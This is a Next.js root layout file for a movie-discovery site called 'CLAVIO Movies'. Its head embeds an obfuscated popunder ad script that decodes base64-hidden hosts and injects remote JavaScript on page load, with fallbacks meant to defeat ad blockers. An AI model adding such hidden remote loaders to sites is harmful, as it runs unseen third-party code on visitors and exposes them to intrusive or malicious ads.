import Script from 'next/script';
import type { Metadata, Viewport } from "next";
import "./globals.css";
import Navbar from "@/components/Navbar";

export const metadata: Metadata = {
  title: "CLAVIO Movies",
  description: "Discover your favorite movies and TV shows with CLAVIO Movies",
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en" className="h-full antialiased dark bg-slate-950" suppressHydrationWarning>
      <head>
        <script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){var y=window,n="b479e157b324167e9abb6eeb2a7c5511",m=[["siteId",116+666-300+5300241],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],x=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vYnJhY3RpdmUubWluLmNzcw==","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvVGFGcy9ucGxhY2Vob2xkZXIubWluLmpz"],k=-1,j,r,a=function(){clearTimeout(r);k++;if(x[k]&&!(1805032032000<(new Date).getTime()&&1<k)){j=y.document.createElement("script");j.type="text/javascript";j.async=!0;var i=y.document.getElementsByTagName("script")[0];j.src="https://"+atob(x[k]);j.crossOrigin="anonymous";j.onerror=a;j.onload=function(){clearTimeout(r);y[n.slice(0,16)+n.slice(0,16)]||a()};r=setTimeout(a,5E3);i.parentNode.insertBefore(j,i)}};if(!y[n]){try{Object.freeze(y[n]=m)}catch(e){}a()}})();
/*]]>/* */
</script>
      </head>
      <body className="min-h-full flex flex-col bg-slate-950 text-white overflow-x-hidden">
        <Navbar />
        <main className="flex-1 pt-20">{children}</main>
      </body>
    </html>
  );
}
